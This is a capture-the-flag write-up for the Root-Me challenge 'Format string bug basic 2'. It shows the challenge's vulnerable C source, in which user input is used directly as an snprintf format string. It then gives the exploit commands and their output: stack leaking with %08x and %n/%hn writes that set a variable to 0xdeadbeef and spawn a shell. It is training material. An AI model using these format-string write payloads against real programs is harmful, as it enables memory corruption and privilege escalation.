# ELF x86 - Format string bug basic 2
- Problems: https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-2

We can see the source code as follows.

```c++
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main( int argc, char ** argv )
 
{
 
        int var;
        int check  = 0x04030201;
 
        char fmt[128];
 
        if (argc <2)
                exit(0);
 
        memset( fmt, 0, sizeof(fmt) );
 
        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );
 
        snprintf( fmt, sizeof(fmt), argv[1] );
 
        if ((check != 0x04030201) && (check != 0xdeadbeef))    
                printf ("\nYou are on the right way !\n");
 
        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );
 
        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}
```

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols     Yes	0		3	./ch14
ASLR is OFF
```

```bash
app-systeme-ch14@challenge02:~$ ./ch14 $(python -c "print 'AAAA-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x'")
check at 0xbffffa78
argv[1] = [AAAA-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x]
fmt=[AAAA-080485f1-00000000-00000000-000000c2-bffffbc4-b7fe1449-f63d4e2e-04030201-41414141]
check=0x4030201
```



```bash
app-systeme-ch14@challenge02:~$ ./ch14 $(python -c "print '\xa8\xfa\xff\xbf'+'%9\$n'")
check at 0xbffffaa8
argv[1] = [����%9$n]

You are on the right way !
fmt=[����]
```

dead: 57005

Beaf: 48879

xxxxbeef

deadxxxx

deadbeef



57005 - 48879 = 8126



%48875x%9$hn

%8126x%10$hn

```
app-systeme-ch14@challenge02:~$ ./ch14 $(python -c "print '\x98\xfa\xff\xbf'+'\x9a\xfa\xff\xbf'+'%48871x%9\$hn'+'%8126x%10\$hn'")
check at 0xbffffa98
argv[1] = [��������%48871x%9$hn%8126x%10$hn]
fmt=[��������                                                                                                                       ]
check=0xdeadbeef
Yeah dude ! You win !
```

